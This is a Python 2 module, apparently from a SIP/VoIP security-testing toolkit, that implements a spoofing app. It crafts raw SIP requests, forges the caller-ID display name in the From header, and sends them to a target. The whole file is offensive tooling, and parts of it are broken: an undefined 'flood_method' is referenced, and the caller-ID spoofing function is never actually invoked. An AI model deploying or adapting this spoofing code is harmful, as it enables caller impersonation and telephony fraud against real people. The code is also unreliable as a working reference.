# Spoofing App

import sys, os, socket, multitask, random
from sipot import App, User, logger

# 39peers
sys.path.append(''.join([os.getcwd(), '/lib/39peers/std']))
import rfc3261, rfc2396
# Others: [multitask, helper_functions]
sys.path.append(''.join([os.getcwd(), '/lib/']))

class spooferUser(User):
	'''The User object provides a layer between the application and the SIP stack.'''
	SPOOFING = 'User Spoofing'
	def __init__(self, app):
		User.__init__(self,app)
        #Spoofer options
		self.spoof_method = app.options.spoof_method
		self.spoof_mode = app.options.spoof_mode
		self.spoof_name = app.options.spoof_name
		self.spoof_msg_file = app.options.spoof_msg_file
        #Spoofer sets
		self._spooferGen = None
        #Listener
		self.listenerOff = True if self.spoof_mode == 'callerID' else False
	
	def stop(self):
		if self._listenerGen:
			self._listenerGen.close()
		if self._registerGen:
			self._registerGen.close()
		if self._spooferGen:
			self._spooferGen.close()
		self._registerGen = None
		return self
		
	def add_spooferGen(self):
		self.state = self.SPOOFING
		if not self._spooferGen:
			self._spooferGen  = self._spoofing()
			multitask.add(self._spooferGen)
		return self
	
	def _spoofing(self):
		# Msg to flood generator ---------
		def _createSpoofMessage():
			if self.spoof_msg_file:
				with open (self.spoof_msg_file, "r") as file_txt:
					file_txt=file_txt.read()
				m = rfc3261.Message()
				try:
					m = m._parse(file_txt.rstrip()+'\r\n\r\n\r\n')
				except ValueError, E: pass # TODO: send 400 response to non-ACK request
			else:
				m = self._ua.createRequest(self.flood_method)
				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
				m.Contact.value.uri.user = self.localParty.uri.user
				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
			return m
		# Spoof msg content ---------
		def spoofMsg(message):
			if self.spoof_mode == 'callerID':
				message.From.value.displayName = self.spoof_name
			return message
		# Stop listener if not necessary in spoof mode
		if self.listenerOff: self._listenerGen.close()
		try:
			# message = spoofMsg(self._ua.createRequest(self.spoof_method))
			message = _createSpoofMessage()
			# Send raw
			print message
			self.send(str(message),self.remoteParty.uri.hostPort,None)
			# Send w/transaction
			# self._ua.sendRequest(message)
			if not self.listenerOff:
				while True:
					response = (yield self._ua.queue.get())
					if response.CSeq.method == 'REGISTER':
						if response.is2xx:   # success
							if self.reg_refresh:
								if response.Expires: self.register_interval = int(response.Expires.value)
								if self.register_interval > 0:								
									self._ua.gen = self._register() # generator for refresh
									multitask.add(self._ua.gen)
							raise StopIteration(('success', None))
						elif response.isfinal: # failed
							raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
			yield multitask.sleep(1)
			self.app.stop()
			yield
			raise StopIteration()
		except GeneratorExit:
			raise StopIteration(('failed', 'Generator closed'))
		self.app.stop()
		yield
		raise StopIteration()

class SpoofingApp(App):
	def __init__(self, options):
		App.__init__(self,options)
		logger.info("ntsga: init spoofing app")

	def start(self):
		self.createUser()
		self.user = self.user.add_listenerGen()
		if self.options.register: self.user.add_registerGen()
		# RUN MULTITASK: multitask.run()
		self.RUNNING
		TaskManager = multitask.get_default_task_manager()
		while self.RUNNING and (TaskManager.has_runnable() or TaskManager.has_io_waits() or TaskManager.has_timeouts()):
			TaskManager.run_next()
		return self
		
	def createUser(self):
		self.user = spooferUser(self).createClient()
		return self
		
	def mainController(self):
		logger.info("ntsga: start spoofing controller")
		while True:
			if self.status: # Print app status
				print self.status.pop(0)
			# If not register needed or already registered => fuzz
			if not self.options.register or (self.options.register and self.user.reg_state==self.user.REGISTERED):
				while True:
					self.user.add_spooferGen()
					if not self.user.state == self.user.SPOOFING:
						self.stop()
						raise StopIteration()
					yield
				yield
			# If register needed and could not register = > stop app
			elif not (self.user.reg_result=='success' or self.user.reg_result==None):
				print 'Could not register user.'
				self.stop()
				raise StopIteration()
			yield
